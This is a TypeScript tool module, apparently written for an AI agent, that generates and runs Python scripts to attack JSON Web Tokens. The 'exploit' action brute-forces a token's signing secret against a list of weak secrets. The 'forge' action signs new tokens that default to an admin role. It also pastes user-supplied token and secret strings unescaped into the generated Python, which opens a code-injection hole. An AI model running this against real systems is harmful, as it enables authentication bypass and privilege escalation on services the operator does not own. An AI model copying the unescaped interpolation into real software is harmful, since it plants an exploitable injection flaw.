import { sharedSandboxManager, type ExecResult } from '../core/sandbox-manager.js';
import type { ToolCall } from '../types/index.js';

export interface JwtExploitArgs {
  action: 'exploit' | 'forge';
  token?: string;
  secret?: string;
  payload?: Record<string, unknown>;
}

export async function executeJwtTool(args: JwtExploitArgs): Promise<ExecResult> {
  const { action, token, secret, payload } = args;

  let pythonCode = '';

  if (action === 'exploit') {
    pythonCode = `
import jwt

token = "${token || ''}"
secrets = ${secret 
  ? `[${secret.split(',').map((s: string) => `"${s}"`).join(',')}]` 
  : '["secret", "password", "jwt_secret", "your-256-bit-secret", "changeme", "123456", "admin"]'}

print(f"[*] Testing {len(secrets)} potential secrets...")
for sec in secrets:
    try:
        decoded = jwt.decode(token, sec, algorithms=["HS256", "HS384", "HS512"])
        print(f"[+] SUCCESS: Secret '{sec}' works!")
        print(f"[+] Payload: {decoded}")
        break
    except jwt.InvalidSignatureError:
        print(f"[-] Secret '{sec}' failed")
    except jwt.ExpiredSignatureError:
        print(f"[+] Token expired but valid with secret '{sec}'")
        print(f"[+] Payload: {jwt.decode(token, sec, algorithms=['HS256'], options={'verify_exp': False})}")
        break
    except Exception as e:
        print(f"[-] Secret '{sec}' error: {e}")
else:
    print("[*] No valid secret found")
`;
  } else if (action === 'forge') {
    pythonCode = `
import jwt
import datetime

payload = ${JSON.stringify(payload || {
  "sub": "user",
  "role": "admin",
  "iat": Math.floor(Date.now() / 1000),
  "exp": Math.floor(Date.now() / 1000) + 3600
})}
secret = "${secret || 'secret'}"
algorithm = "HS256"
token = jwt.encode(payload, secret, algorithm=algorithm)
print(f"[+] Generated token: {token}")
`;
  }

  return sharedSandboxManager.executePython(pythonCode, 60);
}

export async function executeJwtToolCall(toolCall: ToolCall): Promise<ExecResult> {
  const args = toolCall.args as unknown as JwtExploitArgs;
  return executeJwtTool({
    action: args.action,
    token: args.token,
    secret: args.secret,
    payload: args.payload,
  });
}
